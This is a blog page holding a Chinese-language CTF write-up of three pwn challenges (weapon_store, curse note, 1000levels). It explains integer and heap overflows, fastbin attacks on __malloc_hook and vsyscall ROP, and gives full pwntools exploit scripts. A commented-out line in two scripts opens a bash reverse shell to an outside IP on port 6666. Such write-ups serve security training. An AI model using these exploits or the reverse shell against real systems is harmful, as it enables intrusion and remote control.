@@ -1,0 +1,493 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>xman wp</title><meta name="description" content="May the Force be with you"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="weapon_store三个功能：view、buy、checkout
+view，有点想吐槽，你一个卖武器的，价目表居然跟实际价格不一样。。下面的buy功能可以看到实际价格计算方法是100 * (v3 + 1) - 29，也就是说武器1卖171，武器2卖271。371。471。。。。
+
+buy，先计算买的武器单价*数量是不是超过了手里的money，没超过就放到购物车里，但可以通过整数溢出绕过这个限制；另外可以看到malloc的时候还和0x1ff与了一下，可能有堆溢出。
+
+checkout，当手里的money少于买下所有武器要花的钱时，就给你一次堆溢出的机会，这时可以把其他武器的name改换为flag输出。
+
+输入选项的地方看起来可以泄露点什么出来
+
+但这个地方存放的是两个栈里的值，一个text段的值，也得不到.."><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Q1IQ's blog" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Q1IQ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">xman wp</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#weapon-store"><span class="toc-text">weapon_store</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curse-note"><span class="toc-text">curse note</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1000levels"><span class="toc-text">1000levels</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951-%E5%88%A9%E7%94%A8vsyscall%E6%9E%84%E9%80%A0ROP"><span class="toc-text">方法1-利用vsyscall构造ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952-%E7%88%86%E7%A0%B4ebp-leak-elf"><span class="toc-text">方法2-爆破ebp+leak elf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%953-%E7%88%86%E7%A0%B4system%E5%9C%B0%E5%9D%80-vsyscall%E6%9E%84%E9%80%A0ROP"><span class="toc-text">方法3-爆破system地址+vsyscall构造ROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%954-%E7%88%86%E7%A0%B4elf-myexp-1-16"><span class="toc-text">方法4-爆破elf-myexp 1&#x2F;16</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84exp"><span class="toc-text">失败的exp</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/PWN"><i class="tag post-item-tag">PWN</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">xman wp</h1><time class="has-text-grey" datetime="2019-09-30T08:44:36.000Z">2019-09-30</time><article class="mt-2 post-content"><h3 id="weapon-store"><a href="#weapon-store" class="headerlink" title="weapon_store"></a>weapon_store</h3><p>三个功能：view、buy、checkout</p>
+<p>view，有点想吐槽，你一个卖武器的，价目表居然跟实际价格不一样。。下面的buy功能可以看到实际价格计算方法是<code>100 * (v3 + 1) - 29</code>，也就是说武器1卖171，武器2卖271。371。471。。。。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102130240.png"></p>
+<p>buy，先计算买的武器单价*数量是不是超过了手里的money，没超过就放到购物车里，但可以通过整数溢出绕过这个限制；另外可以看到malloc的时候还和0x1ff与了一下，可能有堆溢出。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102130115.png"></p>
+<p>checkout，当手里的money少于买下所有武器要花的钱时，就给你一次堆溢出的机会，这时可以把其他武器的name改换为flag输出。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102130855.png"></p>
+<p>输入选项的地方看起来可以泄露点什么出来</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191030190305.png"></p>
+<p>但这个地方存放的是两个栈里的值，一个text段的值，也得不到什么信息</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191030190101.png"></p>
+<p>这道题绊住我的是做法的问题，一直想的是怎么getshell。虽然data段里有<code>Flag</code>这几个大字，但谁能想到这题是让你泄露它啊。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102125812.png"></p>
+<pre><code class="python">from pwn import *
+debug=1
+#context.log_level = &#39;debug&#39;
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+if debug:
+    io = process(&quot;./weapon_store&quot;)#,env=&#123;&#39;LD_PRELOAD&#39;:&#39;./libc-2.27.so&#39;&#125;)
+else:
+    io = remote(&quot;47.97.253.115&quot;,10002)
+elf = ELF(&#39;./weapon_store&#39;)
+libc = ELF(&quot;./libc-2.27.so&quot;)
+s = lambda x            :io.send(str(x))
+sa = lambda x,y         :io.sendafter(str(x), str(y))
+sl  = lambda x      :io.sendline(str(x))
+sla  = lambda x,y    :io.sendlineafter(str(x), str(y))
+r = lambda x             :io.recv(x)
+ru = lambda x      :io.recvuntil(x)
+def view():
+    ru(&quot;Your choice:&quot;)
+    sl(1)
+def buy(which,amount):
+    ru(&quot;Your choice:&quot;)
+    sl(2)
+    ru(&quot;Which do you want to buy:&quot;)
+    sl(which)
+    ru(&quot;How many do you want to buy:&quot;)
+    sl(amount)
+#1 2 3 4 171 271 371 471
+#money 0x1000 4096
+def checkout():
+     ru(&quot;Your choice:&quot;)
+     sl(3)
+#buy(1,1)#c0
+buy(1,2)#160
+#buy(1,3)#20
+#buy(1,4)#c0
+#buy(1,5)#160
+#buy(1,6)#20
+buy(1,2)#160
+checkout()
+buy(1,9)
+buy(1,9)
+buy(1,9)#20
+buy(4,0x8b2468)#160
+checkout()
+ru(&quot;Do you want to remove a weapon?(y/n)\n&quot;)
+sl(&quot;y&quot;)
+ru(&#39;Please tell us about the reason why you are so poor:&#39;)
+s(&quot;2&quot;*0x158+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*3+p64(0x31)+p32(0x603)+p32(9)+p64(0)+&#39;\x20&#39;)
+checkout()
+ru(&quot;3. Name:       &quot;)
+log.success(&quot;flag : &quot;+ru(&quot;Price:&quot;)[:-6])
+#gdb.attach(io)
+#io.interactive()</code></pre>
+<p>运行结果</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102131903.png"></p>
+<h3 id="curse-note"><a href="#curse-note" class="headerlink" title="curse note"></a>curse note</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>这道题三个功能：new、show、delete，可以用三个note</p>
+<p>new存在很多漏洞点：没检查分配的大小，没检查分配是不是成功，任意地址写0</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102132550.png"></p>
+<p>show平平无奇</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102132752.png"></p>
+<p>delete平平无奇</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102132839.png"></p>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>利用任意地址写0构造overlap然后fastbin attack，唯一的坑点在于分配大内存后，程序就不再从mainarena分配了，而是会从threadarena分配。在threadarena里，size的最后一字节为0x00000101而非0x00000001，所以构造overlap的时候，要先将preisused位置0，再分配这块，此时这块的size的最后一字节就是4了，再free掉这块就成功overlap了。</p>
+<pre><code class="python">from pwn import *
+debug=1
+context.log_level = &#39;debug&#39;
+if debug:
+    io = process(&quot;./curse_note&quot;)
+else:
+    io =remote(&quot;47.97.253.115&quot;,10002)
+elf = ELF(&#39;./curse_note&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+s       = lambda data               :io.send(str(data)) 
+sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
+sl      = lambda data               :io.sendline(str(data))
+sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
+r       = lambda numb       :io.recv(numb)
+ru      = lambda delims  :io.recvuntil(delims)
+
+def new(index,size,info):
+    ru(&quot;choice: &quot;)
+    sl(&quot;1&quot;)
+    ru(&quot;index: &quot;)
+    sl(index)
+    ru(&quot;size: &quot;)
+    sl(size)
+    ru(&quot;info: &quot;)
+    s(info)  
+
+def show(index):
+    ru(&quot;choice: &quot;)
+    sl(&quot;2&quot;)
+    ru(&quot;index: &quot;)
+    sl(index)
+
+
+def delete(index):
+    ru(&quot;choice: &quot;)
+    sl(&quot;3&quot;)
+    ru(&quot;index: &quot;)    
+    sl(index)
+
+def exit():
+    sl(&quot;4&quot;)
+#leak libc
+new(0,0x90-8,&quot;1&quot;)
+new(1,0x20-8,&quot;1&quot;)
+new(2,0x20-8,&quot;1&quot;)
+delete(0)
+new(0,0x90-8,&quot;1&quot;)
+show(0)
+leak=u64(r(16)[-8:])
+libc.address=leak-0x3c4b78
+log.success(&quot;libc : &quot;+hex(libc.address))
+#leak heap
+delete(1)
+delete(2)
+new(1,0x20-8,&quot;\x00&quot;)
+show(1)
+heap=u64(r(8))
+log.success(&quot;heap : &quot;+hex(heap))
+delete(0)
+delete(1)
+
+#leak thread arena base
+new(0,heap+0x11,&quot;a&quot;)
+new(0,0x100-8,&quot;a&quot;)
+new(1,0x70-8,&quot;a&quot;)
+new(2,0x100-8,&quot;a&quot;)
+delete(1)
+new(1,0x30-8,&quot;1&quot;)
+delete(0)
+delete(2)
+new(0,0x100-8,&quot;1&quot;)
+show(0)
+thread_heap=u64(r(16)[-8:])-0x170
+thread_base=thread_heap-0x8b0
+log.success(&quot;thread heap : &quot;+hex(thread_heap))
+delete(0)
+
+#overlap 
+new(0,0x70-8,&quot;a&quot;*(0x70-8-8)+p64(0x170))
+new(2,thread_heap+0x178+1,&quot;11111111&quot;) #preused=0
+new(2,0x100-8,&quot;1111111&quot;)
+delete(2)
+delete(0)
+
+#fastbinattack
+new(2,0x270-8,&quot;a&quot;*(0x100-8)+p64(0x75)+p64(libc.symbols[&#39;__malloc_hook&#39;]-0x23))
+new(0,0x70-8,&quot;1&quot;)
+
+onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+onegadget=libc.address+onegadgets[3]
+c=&quot;d&quot;*0xB+p64(0)+p64(onegadget)+&#39;\x00&#39;*8
+delete(1)
+new(1,0x70-8,c)
+
+delete(0)
+ru(&quot;choice: &quot;)
+sl(&quot;1&quot;)
+ru(&quot;index: &quot;)
+sl(0)
+ru(&quot;size: &quot;)
+sl(0x30)
+
+io.interactive()</code></pre>
+<h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><p>两个功能，go和hint</p>
+<p>首先看hint，hint虽然不能直接打印出system的地址，但是把system的地址放在了<code>rbp-110h</code>这个地方</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104163436.png"></p>
+<p>go让你输入两个数字作为关卡数，如果俩数字之和超过了99，关卡数就被设置为100（题目难道不是叫做1000levels吗？啊？？），算对了就让你过关。可以看到v5、v6就是刚刚system所在的地方，当然要想办法把v5用起来。可以看出v2&lt;=0的时候v5没有被赋值，这样v5就被留下来了，当然留下来是有代价的，要创完100关才给你栈溢出的机会（system可在go里放着呢:P）</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104162509.png"></p>
+<p>关卡里有栈溢出：</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104162710.png"></p>
+<h4 id="方法1-利用vsyscall构造ROP"><a href="#方法1-利用vsyscall构造ROP" class="headerlink" title="方法1-利用vsyscall构造ROP"></a>方法1-利用vsyscall构造ROP</h4><p>这题因为开了PIE，所以不知道gadget的地址，就不好构造ROP。vsyscall是一个只有ret功能的gadget，见下图（0x60是gettimeofday，不知道有啥用反正没有用），vsyscall的地址是固定的，而且我们必须跳到 vsyscall 的开头，而不能直接跳到 ret，这是内核决定的。栈中提前存好one_gadget的地址，然后构造三次ret即可。</p>
+<p>![image-20191102211935780](/Users/apple/Library/Application Support/typora-user-images/image-20191102211935780.png)</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+debug=1
+#context.log_level = &#39;debug&#39;
+vsyscall=0xffffffffff600000
+
+if debug:
+    io = process(&#39;./100levels&#39;)
+else:
+    io=remote(&quot;111.198.29.45&quot;,41268)
+libc=ELF(&#39;./libc.so.6&#39;)
+elf=ELF(&#39;./100levels&#39;)
+
+def go(first, more):
+    io.recvuntil(&quot;Choice:\n&quot;)
+    io.sendline(&#39;1&#39;)    
+    io.recvuntil(&quot;How many levels?\n&quot;)
+    io.sendline(str(first))
+    io.recvuntil(&quot;Any more?\n&quot;)
+    io.sendline(str(more))
+
+def hint():
+    io.recvuntil(&quot;Choice:\n&quot;)
+    io.sendline(&#39;2&#39;)
+
+def answer():
+    io.recvuntil(&quot;Question:&quot;)
+    num1=int(io.recv(3))
+    io.recvuntil(&quot;*&quot;)
+    num2=int(io.recv(3))
+    io.recvuntil(&quot;Answer:&quot;)
+    io.sendline(str(num1*num2))
+
+one_gadget = 0x4526a
+system_offset = libc.symbols[&#39;system&#39;]
+hint()
+go(0,one_gadget - system_offset)
+for i in range(99):
+    answer()
+io.recvuntil(&quot;Question:&quot;)
+num1=int(io.recv(3))
+io.recvuntil(&quot;*&quot;)
+num2=int(io.recv(3))
+io.recvuntil(&quot;Answer:&quot;)
+content=&#39;&#39;
+content+=&#39;c&#39;*48
+content+=&#39;b&#39;*8
+content+=p64(vsyscall)*3
+io.send(content)
+
+io.interactive()</code></pre>
+<h4 id="方法2-爆破ebp-leak-elf"><a href="#方法2-爆破ebp-leak-elf" class="headerlink" title="方法2-爆破ebp+leak elf"></a>方法2-爆破ebp+leak elf</h4><p>可以通过溢出ebp的后一个字节使得ebp和esp相同，在输出Question那一句的时候获得leak elf的机会。</p>
+<p>虽然Question的两个数字被填入了随机数，但因为esp上方存的一定是上一次调用的函数的返回地址，而且栈帧已经改为ebp和esp相同，所以可以泄露ebp-4和ebp-8泄露一个返回地址出来。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104164045.png"></p>
+<pre><code class="python">#no aslr
+from pwn import *
+from LibcSearcher import *
+
+debug =1
+if debug:
+    context.log_level = &#39;debug&#39;
+    io = process(&#39;./100levels&#39;)
+else:
+    io = remote(&quot;111.198.29.45&quot;,44322)
+libc = ELF(&#39;./libc.so&#39;)
+elf = ELF(&#39;./100levels&#39;)
+s       = lambda data               :io.send(str(data)) 
+sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
+sl      = lambda data               :io.sendline(str(data))
+sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+
+one_gadgets_ti = [0x4526a,0xef6c4,0xf0567]
+one_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget=one_gadgets_ti[0]
+
+def hint():
+    sla(&#39;Choice:&#39;,&#39;2&#39;)
+
+def go(first,more):
+    ru(&quot;Choice:\n&quot;)
+    sl(&#39;1&#39;)    
+    ru(&quot;How many levels?\n&quot;)
+    sl(str(first))
+    ru(&quot;Any more?\n&quot;)
+    sl(str(more))
+
+go(2,0)
+ru(&#39;Answer:&#39;)
+s((&#39;0\n&#39;).ljust(0x30, &#39;\x00&#39;) + &#39;\x00&#39;)
+ru(&quot;Question: &quot;)
+c = int(ru(&#39; * &#39;))
+z = int(ru(&#39; = &#39;))
+elf.address = u64(p32(z) + p32(c)) &amp; 0xfffffffff000#leak elf base
+print hex(elf.address)
+ru(&#39;Answer:&#39;)
+c=&#39;&#39;
+c=c.ljust(0x8*5)
+c+=p64(elf.address+0xf47)#main
+sl(c)
+
+hint()
+go(0,one_gadget - libc.symbols[&#39;system&#39;])
+for i in range(99):
+    ru(&quot;Question: &quot;)
+    a=int(ru(&#39;*&#39;)[:-1])
+    b=int(ru(&#39;=&#39;)[:-1])
+    ru(&#39;Answer:&#39;)
+    sl(str(a*b))
+ru(&#39;Answer:&#39;)
+c=&#39;&#39;
+c=c.ljust(0x8*7)
+c+=p64(elf.address+0x1030)#gadget
+s(c)
+
+io.interactive()</code></pre>
+<h4 id="方法3-爆破system地址-vsyscall构造ROP"><a href="#方法3-爆破system地址-vsyscall构造ROP" class="headerlink" title="方法3-爆破system地址+vsyscall构造ROP"></a>方法3-爆破system地址+vsyscall构造ROP</h4><p>在网上找到的脚本，爆破了system的地址。</p>
+<p>不过这个题目里的游戏只让你玩一次，无论失败还是成功都会exit(0)，所以得通过vsyscall回到main函数。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104182004.png"></p>
+<pre><code class="python">from pwn import *
+p = process(&#39;./100levels&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+debug = 0
+if debug:
+    context.log_level = &#39;debug&#39;
+def hint():
+    p.sendlineafter(&#39;Choice:&#39;,&#39;2&#39;)
+
+def go(first,more):
+    p.recvuntil(&quot;Choice:\n&quot;)
+    p.sendline(&#39;1&#39;)    
+    p.recvuntil(&quot;How many levels?\n&quot;)
+    p.sendline(str(first))
+    p.recvuntil(&quot;Any more?\n&quot;)
+    p.sendline(str(more))
+
+def calc(num):
+    p.recvuntil(&#39;Answer:&#39;)
+    p.send(num)
+
+def leak():   
+    start = 0x700000000390
+    for i in range(10,2,-1):
+        for j in range(15,-1,-1):
+            hint()
+            addr_test = (1 &lt;&lt; (i*4) )* j + start
+            go(0,-addr_test)
+            a = p.recvline()
+            #print hex(addr_test)
+            if &#39;Coward&#39; not in a:
+                start = addr_test
+                log.info(&#39;check &#39;+ hex(addr_test))
+                break
+        pro = log.progress(&#39;go&#39;)
+        for i in range(99):
+            pro.status(&#39;level %d&#39;%(i+1))
+            calc(p64(0)*5)
+        calc(p64(0xffffffffff600400)*35)#vsyscall
+        pro.success(&#39;ok&#39;)
+    return start + 0x1000
+
+
+system_addr = leak()
+print &#39;[+] get system addr:&#39;, hex(system_addr)
+
+
+system_addr_libc = libc.symbols[&#39;system&#39;]
+bin_sh_addr_libc = next(libc.search(&#39;/bin/sh&#39;))
+
+bin_sh_addr = bin_sh_addr_libc + system_addr - system_addr_libc
+
+gadget = system_addr - system_addr_libc + 0x21102#pop rdi ret
+
+payload = p64(gadget) + p64(bin_sh_addr) + p64(system_addr)
+
+go(1,0)
+exp = &#39;a&#39;*0x38 + payload
+calc(exp)
+
+p.interactive()</code></pre>
+<p>运行结果：</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191104182332.png"></p>
+<h4 id="方法4-爆破elf-myexp-1-16"><a href="#方法4-爆破elf-myexp-1-16" class="headerlink" title="方法4-爆破elf-myexp 1/16"></a>方法4-爆破elf-myexp 1/16</h4><p>栈中提前存好one_gadget的地址，改写level函数返回地址的后两个字节为pop pop ret的gadegt，有1/16的几率猜对，就能ret到one_gadget。</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import *
+
+debug =1
+if debug:
+    #context.log_level = &#39;debug&#39;
+    io = process(&#39;./100levels&#39;)
+else:
+    io = remote(&quot;111.198.29.45&quot;,44322)
+libc = ELF(&#39;./libc.so&#39;)
+elf = ELF(&#39;./100levels&#39;)
+s       = lambda data               :io.send(str(data)) 
+sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
+sl      = lambda data               :io.sendline(str(data))
+sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+
+one_gadgets_ti = [0x4526a,0xef6c4,0xf0567]
+one_gadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget=0x4526a
+def hint():
+    sla(&#39;Choice:&#39;,&#39;2&#39;)
+
+def go(first,more):
+    ru(&quot;Choice:\n&quot;)
+    sl(&#39;1&#39;)    
+    ru(&quot;How many levels?\n&quot;)
+    sl(str(first))
+    ru(&quot;Any more?\n&quot;)
+    sl(str(more))
+
+while 1:
+    try:
+        hint()
+        go(0,one_gadget - libc.symbols[&#39;system&#39;])
+        for i in range(99):
+            ru(&quot;Question: &quot;)
+            a=int(ru(&#39;*&#39;)[:-1])
+            b=int(ru(&#39;=&#39;)[:-1])
+            ru(&#39;Answer:&#39;)
+            sl(str(a*b))
+        ru(&#39;Answer:&#39;)
+        #1030 
+        #c=&#39;\x0a&#39;+&quot;bash -c &#39;sh -i &amp;&gt;/dev/tcp/47.93.101.26/6666 0&gt;&amp;1&#39;&quot;
+        c=&#39;&#39;
+        c=c.ljust(0x8*7)
+        c+=&#39;\x31\x50&#39;#1/16
+        s(c)
+        io.interactive()
+    except:
+        io.close()
+        io = process(&#39;./100levels&#39;)</code></pre>
+<p>PS:得按空格才能继续运行下一个进程，咋写能写一个真正自动化的呢:(</p>
+<h4 id="失败的exp"><a href="#失败的exp" class="headerlink" title="失败的exp"></a>失败的exp</h4><p>本来想以栈中的变量buf作为system的参数，因为在level函数返回的时候buf的地址在rdi里，然后ret到pop pop ret就ret到了system函数，然而失败了。后来分析是因为栈里的内容是变了的，因为buf的地址在栈顶的上面。但我又不能既为了让buf不变而抬高栈顶，又ret到栈底的system，所以这种方法是行不通了的。</p>
+<pre><code class="python">from pwn import *
+from LibcSearcher import *
+
+debug =1
+if debug:
+    context.log_level = &#39;debug&#39;
+    io = process(&#39;./100levels&#39;)
+else:
+    io=remote(&quot;111.198.29.45&quot;,44322)
+
+s       = lambda data               :io.send(str(data)) 
+sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
+sl      = lambda data               :io.sendline(str(data))
+sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+
+def hint():
+    sla(&#39;Choice:&#39;,&#39;2&#39;)
+
+def go(first,more):
+    ru(&quot;Choice:\n&quot;)
+    sl(&#39;1&#39;)    
+    ru(&quot;How many levels?\n&quot;)
+    sl(str(first))
+    ru(&quot;Any more?\n&quot;)
+    sl(str(more))
+
+def pwn():
+    hint()
+    go(0,0)
+    for i in range(99):
+        ru(&quot;Question: &quot;)
+        a=int(ru(&#39;*&#39;)[:-1])
+        b=int(ru(&#39;=&#39;)[:-1])
+        ru(&#39;Answer:&#39;)
+        sl(str(a*b))
+    gdb.attach(io)
+    ru(&#39;Answer:&#39;)
+    #1030 
+    #c=&#39;\x0a&#39;+&quot;bash -c &#39;sh -i &amp;&gt;/dev/tcp/47.93.101.26/6666 0&gt;&amp;1&#39;&quot;
+    c=str(a*b)+&#39;\x0a&#39;+&quot;/bin/sh\x00&quot;
+    c=c.ljust(0x8*7)
+    c+=&#39;\x31\x50&#39;#aslr off
+    s(c)
+
+pwn()
+io.interactive()</code></pre>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20191102203520.png"></p>
+<p>rdi放着的是栈的地址，当后面执行的时候栈中的内容会变的。</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/heap-overlap-summary/" title="heap overlap方法小结"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: heap overlap方法小结</span></a><a class="button is-default" href="/ByteCtf-note_five/" title="ByteCtf note_five 两种解法"><span class="has-text-weight-semibold">Next: ByteCtf note_five 两种解法</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Q1IQ/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Q1IQ"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> Q1IQ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
